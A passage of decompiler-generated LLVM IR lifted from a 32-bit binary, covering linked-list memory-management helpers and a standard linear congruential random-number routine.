  %v0_10007fc8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10007fc8 = add i32 %v0_10007fc8, 12
  ret i32 %v1_10007fc8

dec_label_pc_10007fd0:                            ; preds = %dec_label_pc_10007f64
  %v1_10007fd0 = add i32 %v0_10007fd0, 4
  %storemerge.in = inttoptr i32 %v1_10007fd0 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v3_10007fd4 = icmp eq i32 %storemerge, 0
  br i1 %v3_10007fd4, label %dec_label_pc_10007fd4.dec_label_pc_10007fdc_crit_edge, label %dec_label_pc_10007f64

dec_label_pc_10007fd4.dec_label_pc_10007fdc_crit_edge: ; preds = %dec_label_pc_10007fd0
  br label %dec_label_pc_10007fdc

dec_label_pc_10007fdc:                            ; preds = %dec_label_pc_10007fd4.dec_label_pc_10007fdc_crit_edge, %dec_label_pc_10007fd4.preheader
  ret i32 0

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_10007f90, { 1, 0 }
  uselistorder i32 %v2_10007f64, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_10007fd0, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v0_10007fb8, { 1, 2, 0 }
  uselistorder i32* %r9.global-to-local, { 0, 4, 5, 1, 2, 3, 6 }
  uselistorder i32* %r11.global-to-local, { 3, 1, 2, 0 }
  uselistorder i32* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007fc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10007f90, { 1, 0 }
  uselistorder label %dec_label_pc_10007f64, { 1, 0 }
  uselistorder label %dec_label_pc_10007fd4.preheader, { 1, 0 }
}

define i32 @function_10007fe4(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10007fe4:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10007fe4 = icmp eq i32 %arg3, 0
  %v2_10007fe8 = add i32 %arg2, 4
  %v3_10007fe8 = inttoptr i32 %v2_10007fe8 to i32*
  store i32 %arg4, i32* %v3_10007fe8, align 4
  %v2_10007fec = add i32 %arg2, 8
  %v3_10007fec = inttoptr i32 %v2_10007fec to i32*
  store i32 %arg3, i32* %v3_10007fec, align 4
  br i1 %v3_10007fe4, label %dec_label_pc_10007ffc, label %dec_label_pc_10007ff4

dec_label_pc_10007ff4:                            ; preds = %dec_label_pc_10007fe4
  %v2_10007ff4 = add i32 %arg3, 4
  %v3_10007ff4 = inttoptr i32 %v2_10007ff4 to i32*
  store i32 %arg2, i32* %v3_10007ff4, align 4
  br label %dec_label_pc_10008000

dec_label_pc_10007ffc:                            ; preds = %dec_label_pc_10007fe4
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10008000

dec_label_pc_10008000:                            ; preds = %dec_label_pc_10007ff4, %dec_label_pc_10007ffc
  %v3_10008000 = icmp eq i32 %arg4, 0
  %v0_10008004 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_10008000, i32 %v0_10008004)
  %v2_10008008 = add i32 %arg4, 8
  %v3_10008008 = inttoptr i32 %v2_10008008 to i32*
  store i32 %arg2, i32* %v3_10008008, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg3, { 1, 0, 2 }
  uselistorder i32 %arg2, { 4, 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10008000, { 1, 0 }
}

define i32 @function_10008010(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10008010:
  %tmp = ptrtoint i32* %arg1 to i32
  %v3_10008010 = icmp eq i32 %arg3, 0
  br i1 %v3_10008010, label %dec_label_pc_10008020, label %dec_label_pc_10008018

dec_label_pc_10008018:                            ; preds = %dec_label_pc_10008010
  %v2_10008018 = add i32 %arg3, 4
  %v3_10008018 = inttoptr i32 %v2_10008018 to i32*
  store i32 %arg2, i32* %v3_10008018, align 4
  br label %dec_label_pc_10008024

dec_label_pc_10008020:                            ; preds = %dec_label_pc_10008010
  store i32 %arg2, i32* %arg1, align 4
  br label %dec_label_pc_10008024

dec_label_pc_10008024:                            ; preds = %dec_label_pc_10008018, %dec_label_pc_10008020
  %v2_10008024 = add i32 %arg2, 8
  %v3_10008024 = inttoptr i32 %v2_10008024 to i32*
  store i32 %arg3, i32* %v3_10008024, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_10008024, { 1, 0 }
}

define i32 @function_1000802c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000802c:
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %tmp, i32* %r10.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v2_10008044 = load i32, i32* %arg1, align 4
  store i32 %v2_10008044, i32* @r31, align 4
  %v2_10008048 = add i32 %arg3, %arg2
  store i32 %v2_10008048, i32* %r3.global-to-local, align 4
  %v3_1000805c7 = icmp eq i32 %v2_10008044, 0
  %v1_100080608 = add i32 %v2_10008044, 12
  %tmp69 = icmp uge i32 %v1_100080608, %arg2
  %or.cond10 = or i1 %v3_1000805c7, %tmp69
  br i1 %or.cond10, label %dec_label_pc_1000806c, label %dec_label_pc_10008054

dec_label_pc_10008054:                            ; preds = %dec_label_pc_1000802c, %dec_label_pc_10008054
  %v0_100080b411 = phi i32 [ %v3_10008058, %dec_label_pc_10008054 ], [ %v2_10008044, %dec_label_pc_1000802c ]
  store i32 %v0_100080b411, i32* %r11.global-to-local, align 4
  %v1_10008058 = add i32 %v0_100080b411, 4
  %v2_10008058 = inttoptr i32 %v1_10008058 to i32*
  %v3_10008058 = load i32, i32* %v2_10008058, align 4
  store i32 %v3_10008058, i32* @r31, align 4
  %v3_1000805c = icmp eq i32 %v3_10008058, 0
  %v1_10008060 = add i32 %v3_10008058, 12
  %tmp6 = icmp uge i32 %v1_10008060, %arg2
  %or.cond = or i1 %v3_1000805c, %tmp6
  br i1 %or.cond, label %dec_label_pc_1000806c, label %dec_label_pc_10008054

dec_label_pc_1000806c:                            ; preds = %dec_label_pc_10008054, %dec_label_pc_1000802c
  %v0_100080a8.lcssa = phi i32 [ 0, %dec_label_pc_1000802c ], [ %v0_100080b411, %dec_label_pc_10008054 ]
  %v0_100080b4.lcssa = phi i32 [ %v2_10008044, %dec_label_pc_1000802c ], [ %v3_10008058, %dec_label_pc_10008054 ]
  %v3_1000805c.lcssa = phi i1 [ %v3_1000805c7, %dec_label_pc_1000802c ], [ %v3_1000805c, %dec_label_pc_10008054 ]
  br i1 %v3_1000805c.lcssa, label %dec_label_pc_10008124, label %dec_label_pc_10008074

dec_label_pc_10008074:                            ; preds = %dec_label_pc_1000806c
  %v1_10008074 = inttoptr i32 %v0_100080b4.lcssa to i32*
  %v2_10008074 = load i32, i32* %v1_10008074, align 4
  %v2_10008078 = sub i32 %v0_100080b4.lcssa, %v2_10008074
  %v1_1000807c = add i32 %v2_10008078, 12
  %v3_10008080 = icmp ugt i32 %v1_1000807c, %v2_10008048
  br i1 %v3_10008080, label %dec_label_pc_10008124, label %dec_label_pc_10008088

dec_label_pc_10008088:                            ; preds = %dec_label_pc_10008074
  %v4_10008080 = icmp eq i32 %v1_1000807c, %v2_10008048
  %v2_1000808c = add i32 %v2_10008074, %arg3
  store i32 %v2_1000808c, i32* @r29, align 4
  br i1 %v4_10008080, label %dec_label_pc_10008094, label %dec_label_pc_100080c4

dec_label_pc_10008094:                            ; preds = %dec_label_pc_10008088
  %v3_10008094 = icmp eq i32 %v0_100080a8.lcssa, 0
  br i1 %v3_10008094, label %dec_label_pc_10008118, label %dec_label_pc_1000809c

dec_label_pc_1000809c:                            ; preds = %dec_label_pc_10008094
  %v1_1000809c = add i32 %v0_100080a8.lcssa, 12
  %v4_100080a0 = icmp eq i32 %v1_1000809c, %arg2
  br i1 %v4_100080a0, label %dec_label_pc_100080a8, label %dec_label_pc_10008118

dec_label_pc_100080a8:                            ; preds = %dec_label_pc_1000809c
  %v1_100080a8 = inttoptr i32 %v0_100080a8.lcssa to i32*
  %v2_100080a8 = load i32, i32* %v1_100080a8, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v1_100080b0 = add i32 %v0_100080a8.lcssa, 8
  %v2_100080b0 = inttoptr i32 %v1_100080b0 to i32*
  %v3_100080b0 = load i32, i32* %v2_100080b0, align 4
  %v2_100080b8 = add i32 %v2_100080a8, %v2_1000808c
  store i32 %v2_100080b8, i32* @r29, align 4
  %v5_100080bc = call i32 @function_10008010(i32* %arg1, i32 %v0_100080b4.lcssa, i32 %v3_100080b0, i32 %v2_10008048)
  store i32 %v5_100080bc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008118

dec_label_pc_100080c4:                            ; preds = %dec_label_pc_10008088
  %v1_100080c4 = add i32 %v0_100080b4.lcssa, 4
  %v2_100080c4 = inttoptr i32 %v1_100080c4 to i32*
  %v3_100080c4 = load i32, i32* %v2_100080c4, align 4
  %v3_100080c8 = icmp eq i32 %v3_100080c4, 0
  br i1 %v3_100080c8, label %dec_label_pc_10008100, label %dec_label_pc_100080d0

dec_label_pc_100080d0:                            ; preds = %dec_label_pc_100080c4
  %v1_100080d0 = inttoptr i32 %v3_100080c4 to i32*
  %v2_100080d0 = load i32, i32* %v1_100080d0, align 4
  %v2_100080d4 = sub i32 %v3_100080c4, %v2_100080d0
  %v1_100080d8 = add i32 %v2_100080d4, 12
  %v4_100080dc = icmp eq i32 %v2_10008048, %v1_100080d8
  br i1 %v4_100080dc, label %dec_label_pc_100080e4, label %dec_label_pc_10008100

dec_label_pc_100080e4:                            ; preds = %dec_label_pc_100080d0
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_100080f0 = add i32 %v2_100080d0, %v2_1000808c
  store i32 %v2_100080f0, i32* @r29, align 4
  store i32 %v3_100080c4, i32* @r31, align 4
  %v5_100080f8 = call i32 @function_10008010(i32* %arg1, i32 %v3_100080c4, i32 %v0_100080a8.lcssa, i32 %v2_10008048)
  store i32 %v5_100080f8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008118

dec_label_pc_10008100:                            ; preds = %dec_label_pc_100080d0, %dec_label_pc_100080c4
  %v2_10008100 = add i32 %v0_100080b4.lcssa, %arg3
  store i32 %v2_10008100, i32* @r31, align 4
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 268468504, i32* @lr, align 4
  %v5_10008114 = call i32 @function_10007fe4(i32* %arg1, i32 %v2_10008100, i32 %v0_100080a8.lcssa, i32 %v3_100080c4)
  store i32 %v5_10008114, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008118

dec_label_pc_10008118:                            ; preds = %dec_label_pc_1000809c, %dec_label_pc_10008094, %dec_label_pc_100080e4, %dec_label_pc_100080a8, %dec_label_pc_10008100
  %v0_10008118 = load i32, i32* @r31, align 4
  store i32 %v0_10008118, i32* @r30, align 4
  %v0_1000811c = load i32, i32* @r29, align 4
  %v2_1000811c = inttoptr i32 %v0_10008118 to i32*
  store i32 %v0_1000811c, i32* %v2_1000811c, align 4
  br label %dec_label_pc_10008140

dec_label_pc_10008124:                            ; preds = %dec_label_pc_10008074, %dec_label_pc_1000806c
  %v2_10008124 = add i32 %v2_10008048, -12
  %v3_10008124 = inttoptr i32 %v2_10008124 to i32*
  store i32 %arg3, i32* %v3_10008124, align 4
  %v0_10008128 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008128 = add i32 %v0_10008128, -12
  store i32 %v1_10008128, i32* @r30, align 4
  %v0_1000812c = load i32, i32* %r11.global-to-local, align 4
  %v0_10008130 = load i32, i32* %r10.global-to-local, align 4
  store i32 %v0_10008130, i32* %r3.global-to-local, align 4
  %v0_10008134 = load i32, i32* @r31, align 4
  store i32 268468544, i32* @lr, align 4
  %v4_1000813c = inttoptr i32 %v0_10008130 to i32*
  %v5_1000813c = call i32 @function_10007fe4(i32* %v4_1000813c, i32 %v1_10008128, i32 %v0_1000812c, i32 %v0_10008134)
  store i32 %v5_1000813c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10008140

dec_label_pc_10008140:                            ; preds = %dec_label_pc_10008118, %dec_label_pc_10008124
  %v0_10008144 = load i32, i32* @r30, align 4
  store i32 %v0_10008144, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008144

; uselistorder directives
  uselistorder i32 %v3_100080c4, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v1_1000807c, { 1, 0 }
  uselistorder i32 %v0_100080b4.lcssa, { 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_100080a8.lcssa, { 1, 0, 4, 5, 3, 2 }
  uselistorder i32 %v3_10008058, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v2_10008048, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %tmp, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 10, 4, 5, 6, 7, 8, 9, 11, 0 }
  uselistorder i32* %r11.global-to-local, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 3, 2, 0, 1 }
  uselistorder i32* %arg1, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_10008140, { 1, 0 }
  uselistorder label %dec_label_pc_10008118, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_10008054, { 1, 0 }
}

define i32 @function_10008158() local_unnamed_addr {
dec_label_pc_10008158:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_10008174 = ptrtoint i32* %stack_var_-52 to i32
  store i32 ptrtoint (i32* @global_var_10010310.266 to i32), i32* @r29, align 4
  store i32 %v2_10008174, i32* @r3, align 4
  %v0_10008188 = call i32 @function_10008c80()
  %v0_10008190 = call i32 @function_10008c78()
  %v2_10008198 = ptrtoint i32* %stack_var_-56 to i32
  %v3_100081a0 = call i32 @function_10008434(i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10010000.2 to i32), i32 808) to i32*), i32 %v2_10008198)
  store i32 %v2_10008174, i32* @r3, align 4
  %v0_100081ac = call i32 @function_10008c80()
  %v3_100081b4 = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_100081b4
}

define i32 @function_100081c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_100081c8:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10010310.266 to i32), i32* %r29.global-to-local, align 4
  %v2_100081ec = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100081ec, i32* @r3, align 4
  %v0_100081f4 = call i32 @function_10008c80()
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10008200 = call i32 @function_10008c78()
  store i32 268468764, i32* @lr, align 4
  %v3_10008218 = call i32 @function_10008340(i32 %arg1, i32* nonnull @global_var_10010328)
  %v1_10008220 = icmp slt i32 %v3_10008218, 0
  store i32 %v2_100081ec, i32* @r3, align 4
  br i1 %v1_10008220, label %dec_label_pc_10008230, label %dec_label_pc_1000822c

dec_label_pc_1000822c:                            ; preds = %dec_label_pc_100081c8
  store i32 ptrtoint (i32** @global_var_1001032c.270 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_10008230

dec_label_pc_10008230:                            ; preds = %dec_label_pc_100081c8, %dec_label_pc_1000822c
  %v0_10008230 = call i32 @function_10008c80()
  %v0_10008238 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_10008238

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_10008230, { 1, 0 }
}

define i32 @function_1000824c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_1000824c:
  %stack_var_-56 = alloca i32, align 4
  %v2_1000825c = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_1000825c, i32* @r3, align 4
  %v0_10008284 = call i32 @function_10008c80()
  %v0_1000828c = call i32 @function_10008c78()
  store i32 %arg1, i32* @r3, align 4
  store i32 268468908, i32* @lr, align 4
  %v4_100082a8 = inttoptr i32 %arg1 to i32*
  %v5_100082a8 = call i32 @function_100085a8(i32* %v4_100082a8, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10010328 to i32))
  store i32 %v2_1000825c, i32* @r3, align 4
  %v0_100082b4 = call i32 @function_10008c80()
  ret i32 ptrtoint (i32** @global_var_1001032c.270 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_100082d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_100082d4:
  %stack_var_-40 = alloca i32, align 4
  %v2_100082ec = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_100082ec, i32* @r3, align 4
  %v0_10008304 = call i32 @function_10008c80()
  %v0_1000830c = call i32 @function_10008c78()
  store i32 ptrtoint (i32* @global_var_10010328 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268469024, i32* @lr, align 4
  %v0_1000831c = call i32 @function_100084c4()
  store i32 %v2_100082ec, i32* @r3, align 4
  %v0_10008328 = call i32 @function_10008c80()
  ret i32 %v0_10008328

; uselistorder directives
  uselistorder i32* @global_var_10010328, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10010328 to i32), { 1, 0 }
}

define i32 @function_10008340(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_10008340:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_10008340 = add i32 %tmp, 12
  %v2_10008340 = inttoptr i32 %v1_10008340 to i32*
  %v3_10008340 = load i32, i32* %v2_10008340, align 4
  store i32 %v3_10008340, i32* %r11.global-to-local, align 4
  %v0_10008344 = load i32, i32* @lr, align 4
  store i32 %v0_10008344, i32* %r0.global-to-local, align 4
  %v1_1000834c = add i32 %arg1, 4
  store i32 %v1_1000834c, i32* %r3.global-to-local, align 4
  %v1_10008350 = add i32 %tmp, 8
  %v2_10008350 = inttoptr i32 %v1_10008350 to i32*
  %v3_10008350 = load i32, i32* %v2_10008350, align 4
  store i32 %v3_10008350, i32* %r9.global-to-local, align 4
  %v3_10008354 = icmp eq i32 %v3_10008340, 0
  br i1 %v3_10008354, label %dec_label_pc_10008360, label %dec_label_pc_10008368

dec_label_pc_10008360:                            ; preds = %dec_label_pc_10008340
  %v2_10008360 = add i32 %v3_10008350, -4
  %v3_10008360 = inttoptr i32 %v2_10008360 to i32*
  store i32 0, i32* %v3_10008360, align 4
  br label %dec_label_pc_10008380

dec_label_pc_10008368:                            ; preds = %dec_label_pc_10008340
  %v1_10008368 = add i32 %tmp, 4
  %v2_10008368 = inttoptr i32 %v1_10008368 to i32*
  %v3_10008368 = load i32, i32* %v2_10008368, align 4
  %v2_1000836c = sub i32 %v3_10008368, %v3_10008350
  %v4_10008370 = sdiv i32 %v2_1000836c, 4
  %v1_10008374 = mul i32 %v4_10008370, 5
  %v2_10008378 = add i32 %v1_10008374, %v3_10008340
  store i32 %v2_10008378, i32* %r0.global-to-local, align 4
  %v2_1000837c = add i32 %v3_10008350, -4
  %v3_1000837c = inttoptr i32 %v2_1000837c to i32*
  store i32 %v2_10008378, i32* %v3_1000837c, align 4
  br label %dec_label_pc_10008380

dec_label_pc_10008380:                            ; preds = %dec_label_pc_10008360, %dec_label_pc_10008368
  %v0_10008380 = load i32, i32* %r3.global-to-local, align 4
  %v1_10008380 = add i32 %v0_10008380, -4
  %v2_10008380 = inttoptr i32 %v1_10008380 to i32*
  %v3_10008380 = load i32, i32* %v2_10008380, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1000ec70.271 to i32), i32* %r9.global-to-local, align 4
  %v2_10008394 = srem i32 %v3_10008380, 5
  store i32 %v2_10008394, i32* %r11.global-to-local, align 4
  %v2_100083a0 = icmp ugt i32 %v2_10008394, 4
  %v1_100083a4 = mul nsw i32 %v2_10008394, 4
  store i32 %v1_100083a4, i32* %r0.global-to-local, align 4
  %v2_100083a8 = add i32 %v1_100083a4, ptrtoint (i32* @global_var_1000ec70.271 to i32)
  store i32 %v2_100083a8, i32* %r10.global-to-local, align 4
  br i1 %v2_100083a0, label %dec_label_pc_10008410, label %dec_label_pc_100083b4

dec_label_pc_100083b4:                            ; preds = %dec_label_pc_10008380
  %v3_100083ac = icmp eq i32 %v2_10008394, 0
  %v1_100083b4 = add i32 %v1_100083a4, add (i32 ptrtoint (i32* @global_var_1000ec70.271 to i32), i32 20)
  %v2_100083b4 = inttoptr i32 %v1_100083b4 to i32*
  %v3_100083b4 = load i32, i32* %v2_100083b4, align 4
  store i32 %v3_100083b4, i32* %r10.global-to-local, align 4
  %v3_100083b8 = inttoptr i32 %v2_100083a8 to i32*
  %v4_100083b8 = load i32, i32* %v3_100083b8, align 4
  store i32 %v4_100083b8, i32* %r9.global-to-local, align 4
  store i32 %v2_10008394, i32* %v2_10008340, align 4
  %v0_100083c0 = load i32, i32* %r10.global-to-local, align 4
  %v1_100083c0 = mul i32 %v0_100083c0, 4
  store i32 %v1_100083c0, i32* %r0.global-to-local, align 4
  %v2_100083c4 = add i32 %tmp, 16
  %v3_100083c4 = inttoptr i32 %v2_100083c4 to i32*
  store i32 %v0_100083c0, i32* %v3_100083c4, align 4
  %v0_100083c8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100083c8 = add i32 %tmp, 20
  %v3_100083c8 = inttoptr i32 %v2_100083c8 to i32*
  store i32 %v0_100083c8, i32* %v3_100083c8, align 4
  %v0_100083cc = load i32, i32* %r3.global-to-local, align 4
  %v1_100083cc = load i32, i32* %r0.global-to-local, align 4
  %v2_100083cc = add i32 %v1_100083cc, %v0_100083cc
  store i32 %v2_100083cc, i32* %r8.global-to-local, align 4
  br i1 %v3_100083ac, label %dec_label_pc_10008404, label %dec_label_pc_100083d4

dec_label_pc_100083d4:                            ; preds = %dec_label_pc_100083b4
  %v1_100083d4 = add i32 %v0_100083cc, -4
  %v2_100083d4 = inttoptr i32 %v1_100083d4 to i32*
  %v3_100083d4 = load i32, i32* %v2_100083d4, align 4
  %v1_100083d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_100083d8 = sdiv i32 %v3_100083d4, %v1_100083d8
  %v1_100083dc = load i32, i32* %r9.global-to-local, align 4
  %v2_100083dc = add i32 %v1_100083dc, %v2_100083d8
  store i32 %v2_100083dc, i32* %r9.global-to-local, align 4
  %v1_100083e0 = mul i32 %v2_100083d8, 4
  %v1_100083e4 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083e4 = sdiv i32 %v2_100083dc, %v1_100083e4
  store i32 %v2_100083e4, i32* %r11.global-to-local, align 4
  %v2_100083e8 = add i32 %v1_100083e0, %v0_100083cc
  store i32 %v2_100083e8, i32* %r0.global-to-local, align 4
  %v2_100083ec = add i32 %tmp, 4
  %v3_100083ec = inttoptr i32 %v2_100083ec to i32*
  store i32 %v2_100083e8, i32* %v3_100083ec, align 4
  %v0_100083f0 = load i32, i32* %r11.global-to-local, align 4
  %v1_100083f0 = load i32, i32* %r10.global-to-local, align 4
  %v2_100083f0 = mul i32 %v1_100083f0, %v0_100083f0
  store i32 %v2_100083f0, i32* %r11.global-to-local, align 4
  %v1_100083f4 = load i32, i32* %r9.global-to-local, align 4
  %v2_100083f4 = sub i32 %v1_100083f4, %v2_100083f0
  %v1_100083f8 = mul i32 %v2_100083f4, 4
  %v0_100083fc = load i32, i32* %r3.global-to-local, align 4
  %v2_100083fc = add i32 %v1_100083f8, %v0_100083fc
  store i32 %v2_100083fc, i32* %r9.global-to-local, align 4
  store i32 %v2_100083fc, i32* %arg2, align 4
  %v0_10008404.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_10008404

dec_label_pc_10008404:                            ; preds = %dec_label_pc_100083b4, %dec_label_pc_100083d4
  %v0_10008404 = phi i32 [ %v2_100083cc, %dec_label_pc_100083b4 ], [ %v0_10008404.pre, %dec_label_pc_100083d4 ]
  %v2_10008404 = add i32 %tmp, 24
  %v3_10008404 = inttoptr i32 %v2_10008404 to i32*
  store i32 %v0_10008404, i32* %v3_10008404, align 4
  %v0_10008408 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_10008408, i32* %v2_10008350, align 4
  %v0_10008424.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008420

dec_label_pc_10008410:                            ; preds = %dec_label_pc_10008380
  %v0_10008410 = call i32 @function_10004b48()
  store i32 %v0_10008410, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10008418 = inttoptr i32 %v0_10008410 to i32*
  store i32 22, i32* %v2_10008418, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_10008420

dec_label_pc_10008420:                            ; preds = %dec_label_pc_10008404, %dec_label_pc_10008410
  %v0_10008424 = phi i32 [ %v0_10008424.pre, %dec_label_pc_10008404 ], [ -1, %dec_label_pc_10008410 ]
  store i32 %v0_10008344, i32* %r0.global-to-local, align 4
  store i32 %v0_10008424, i32* %r3.global-to-local, align 4
  ret i32 %v0_10008424

; uselistorder directives
  uselistorder i32 %v0_10008424, { 1, 0 }
  uselistorder i32 %v0_100083cc, { 0, 2, 1 }
  uselistorder i32 %v0_100083c0, { 1, 0 }
  uselistorder i32 %v1_100083a4, { 2, 1, 0 }
  uselistorder i32 %v2_10008394, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v3_10008350, { 1, 2, 0, 3 }
  uselistorder i32 %tmp, { 4, 5, 2, 1, 0, 3, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_10008420, { 1, 0 }
  uselistorder label %dec_label_pc_10008404, { 1, 0 }
  uselistorder label %dec_label_pc_10008380, { 1, 0 }
}

define i32 @function_10008434(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10008434:
  %r10.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_10008434 = add i32 %tmp, 12
  %v2_10008434 = inttoptr i32 %v1_10008434 to i32*
  %v3_10008434 = load i32, i32* %v2_10008434, align 4
  %v1_10008440 = add i32 %tmp, 8
  %v2_10008440 = inttoptr i32 %v1_10008440 to i32*
  %v3_10008440 = load i32, i32* %v2_10008440, align 4
  store i32 %v3_10008440, i32* %r7.global-to-local, align 4
  %v3_10008444 = icmp eq i32 %v3_10008434, 0
  br i1 %v3_10008444, label %dec_label_pc_1000844c, label %dec_label_pc_10008468

dec_label_pc_1000844c:                            ; preds = %dec_label_pc_10008434
  %v1_1000844c = inttoptr i32 %v3_10008440 to i32*
  %v2_1000844c = load i32, i32* %v1_1000844c, align 4
  %v2_10008450 = mul i32 %v2_1000844c, 1103515245
  %v1_10008454 = add i32 %v2_10008450, 12345
  %v1_10008458 = urem i32 %v1_10008454, -2147483648
  store i32 %v1_10008458, i32* %r9.global-to-local, align 4
  store i32 %v1_10008458, i32* %v1_1000844c, align 4
  %v0_10008460 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008460 = inttoptr i32 %arg2 to i32*
  store i32 %v0_10008460, i32* %v2_10008460, align 4
  br label %dec_label_pc_100084bc

dec_label_pc_10008468:                            ; preds = %dec_label_pc_10008434
  %v2_10008468 = load i32, i32* %arg1, align 4
  %v1_1000846c = add i32 %tmp, 4
  %v2_1000846c = inttoptr i32 %v1_1000846c to i32*
  %v3_1000846c = load i32, i32* %v2_1000846c, align 4
  store i32 %v3_1000846c, i32* %r9.global-to-local, align 4
  %v1_10008470 = add i32 %tmp, 24
  %v2_10008470 = inttoptr i32 %v1_10008470 to i32*
  %v3_10008470 = load i32, i32* %v2_10008470, align 4
  %v1_10008474 = add i32 %v2_10008468, 4
  store i32 %v1_10008474, i32* %r8.global-to-local, align 4
  %v1_10008478 = add i32 %v3_1000846c, 4
  %v1_1000847c = inttoptr i32 %v3_1000846c to i32*
  %v2_1000847c = load i32, i32* %v1_1000847c, align 4
  store i32 %v2_1000847c, i32* %r9.global-to-local, align 4
  store i32 %v1_10008478, i32* %r10.global-to-local, align 4
  %v2_10008488 = icmp ult i32 %v1_10008474, %v3_10008470
  %v1_1000848c = inttoptr i32 %v2_10008468 to i32*
  %v2_1000848c = load i32, i32* %v1_1000848c, align 4
  %v2_10008490 = add i32 %v2_1000848c, %v2_1000847c
  %v1_10008494 = udiv i32 %v2_10008490, 2
  store i32 %v1_10008494, i32* %r9.global-to-local, align 4
  store i32 %v2_10008490, i32* %v1_1000848c, align 4
  %v0_1000849c = load i32, i32* %r9.global-to-local, align 4
  %v2_1000849c = inttoptr i32 %arg2 to i32*
  store i32 %v0_1000849c, i32* %v2_1000849c, align 4
